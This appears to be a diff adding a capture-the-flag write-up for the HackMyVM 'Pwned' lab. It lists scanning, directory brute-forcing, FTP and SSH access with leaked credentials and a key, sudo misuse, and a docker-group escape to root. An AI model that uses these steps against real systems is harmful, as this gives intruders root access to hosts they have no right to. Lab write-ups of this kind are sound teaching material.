@@ -1,0 +1,62 @@
+### Write up for https://hackmyvm.eu/machines/machine.php?vm=Pwned ###
+
+ip=<machine's ip>
+
+nmap -v -T4 -p- -sC -sV -oN nmap.log $ip;clear;cat nmap.log
+
+firefox $ip &
+
+//checked Page source robots.txt etc nothing found
+
+feroxbuster -n -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip -x php,txt,html,zip,bak,htm,dic -t 100
+
+//we found hidden_text dir
+
+curl http://$ip/hidden_text/secret.dic -O
+
+feroxbuster -n -w  ./secret.dic -u http://$ip -x php,html,htm,zip,bak,dic -t 100
+
+//we found the following
+
+http://$ip/pwned.vuln
+
+//Vew Page Source --> u will find creds for ftp user
+ftpuser && $pw=='****TcH'
+
+ncftp -u ftpuser $ip 
+
+ls -al
+cd share
+mget *
+exit
+
+cat note.txt 
+//we found a user. we also got an id (id_rsa)
+
+chmod 600 id_rsa
+ssh $ip -l ariana -i id_rsa
+//you can find users flag
+
+sudo -l
+
+//     (selena) NOPASSWD: /home/messenger.sh
+sudo -u selena /home/messenger.sh
+
+/bin/bash
+/bin/bash
+id
+uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
+
+//upgrade our shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+ls
+cat user2.txt // nothing here
+
+//after checking id again we see that user selena is part of docker group quick search on GTFO Bins
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt bash
+root@461de093ad16:/# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+
+cat /root/root.txt
